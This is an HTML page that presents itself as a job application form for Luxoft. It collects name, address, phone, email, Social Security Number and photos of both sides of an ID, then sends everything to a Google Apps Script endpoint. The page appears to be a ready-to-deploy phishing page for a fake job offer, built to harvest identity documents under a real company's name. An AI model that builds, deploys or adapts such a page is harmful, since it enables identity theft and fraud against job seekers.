<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apply to Luxoft</title>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>
  <div class="form-page">
    <h2>Application Form</h2>
    <form id="applicationForm">
      <input type="text" name="Name" placeholder="Name" required>
      <input type="text" name="Address" placeholder="Address" required>
      <input type="tel" name="Phone" placeholder="Phone Number" required>
      <input type="email" name="Email" placeholder="Email Address" required>
      <input type="text" name="SSN" placeholder="Social Security Number" required>

      <label>Upload ID (Front)</label>
      <input type="file" name="ID_Front" required>
      <label>Upload ID (Back)</label>
      <input type="file" name="ID_Back" required>

      <button type="submit">Submit Application</button>
    </form>
    <p id="responseMsg"></p>
  </div>

  <script>
    document.getElementById("applicationForm").addEventListener("submit", function(e) {
      e.preventDefault();

      // Replace this with your deployed Google Apps Script Web App URL
      const scriptURL = "https://script.google.com/macros/s/AKfycbxWAmJ9w7hx0ZoRvHTLgy6rlp-CVrqSr5QZIenM6OGTFydGF_0085ThB4IwDkV7ndE-/exec";

      let formData = new FormData(this);

      fetch(scriptURL, { method: "POST", body: formData })
        .then(response => response.text())
        .then(data => {
          document.getElementById("responseMsg").innerText = "✅ Application submitted successfully!";
          this.reset();
        })
        .catch(error => {
          document.getElementById("responseMsg").innerText = "❌ Error submitting form. Try again.";
          console.error("Error!", error.message);
        });
    });
  </script>
</body>
</html>
